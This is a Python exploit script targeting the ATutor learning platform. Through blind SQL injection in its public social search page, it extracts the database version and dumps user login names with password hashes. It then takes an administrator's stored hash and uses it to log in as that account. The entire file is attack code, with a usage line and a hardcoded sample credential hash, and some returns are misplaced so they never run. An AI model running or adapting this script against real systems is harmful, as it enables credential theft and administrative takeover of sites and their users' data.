import sys, requests, hashlib, zipfile, re

s = requests.Session()

def searchFriends(ip, injStr):
	for i in range(32, 126):
		target = "http://%s/mods/_standard/social/index_public.php?q=%s" % (ip, injStr.replace("[CHAR]", str(i)))
		r = requests.get(target)
		content_length = int(r.headers['Content-Length'])
		if(content_length > 20):
			return i
			return None


def count(column, ip):
	counted = ""
	for i in range(1, 100):
		injectStr = "test')/**/or/**/(ascii(substring((select/**/count(%s)/**/from/**/AT_members),%d,1)))=[CHAR]%%23" % (column,i)
		try:
			counted = chr(searchFriends(ip, injectStr))
		except:
			break
	return int(counted)


def inject(inj, ip):
	output = ""
	for i in range(1, 100):
		injectStr = "test')/**/or/**/(ascii(substring((%s),%d,1)))=[CHAR]%%23" % (inj,i)
		try:
			extractedChar = chr(searchFriends(ip, injectStr))
			sys.stdout.write(extractedChar)
			sys.stdout.flush()
			output = output + extractedChar
		except:
			break
			return output


def generateHash(passwd, token):
	m = hashlib.sha1()
	m.update(passwd.encode('utf-8') + token.encode('utf-8'))
	return m.hexdigest()

def login(ip, hash, user):
	# instructor:fb643629f3931b0cd5ac232d9b74e74a769498ef
	target = "http://%s/login.php" % ip
	token = "xxx"
	hashed = generateHash(hash, token)
	d = {
		"form_password_hidden" : hashed,
		"form_login": "%s" % user,
		"submit" : "Login",
		"token" : token
	}

	output = dict()
	r = s.post(target, data=d)
	res = r.text
	#print(res)
	if "Create Course: My Start Page" in res or "My Courses: My Start Page" in res:
		usermatch = re.search(r'<strong>(.*?)<\/strong>\s*\|\s*<a href="\/logout\.php">Log-out<\/a>', res)
		if usermatch:
			output = usermatch.group(1)
			print("\n\n[+] Login successful!")
			print("[+] Logged in as:", output)
		else:
			print("[!] Login failed.")
	return False


def main():
	if len(sys.argv) != 2:
		print("[!] Usage: python3 %s <target:port/atutorPath>" % sys.argv[0])
		print("ex: python3 %s 192.168.1.100:8080/atutor\n" % sys.argv[0])
		sys.exit(-1)

	ip = sys.argv[1]

	print("\n[+] Database version")
	query = "select/**/version()"
	dbVersion = inject(query, ip)

	# Commented for better performance ;)
	print("\n\n[+] Retrieving credentials...")
	usercount = count("login", ip)
	for i in range(0, usercount):
		query = "select/**/concat(login,0x3a,password)/**/from/**/AT_members/**/order/**/by/**/login/**/limit/**/1/**/offset/**/%d" % i
		username = inject(query, ip)
		print("")

	print("\n[+] Retrieving credentials from a privileged account...")
	query = "select/**/login/**/from/**/AT_members/**/where/**/status/**/=/**/3/**/limit/**/1"
	adminuser = inject(query, ip)
	print(":", end = '')
	query = "select/**/password/**/from/**/AT_members/**/where/**/status/**/=/**/3/**/limit/**/1"
	adminpass = inject(query, ip)
	you = login(ip, adminpass, adminuser)


if __name__ == "__main__":
	main()
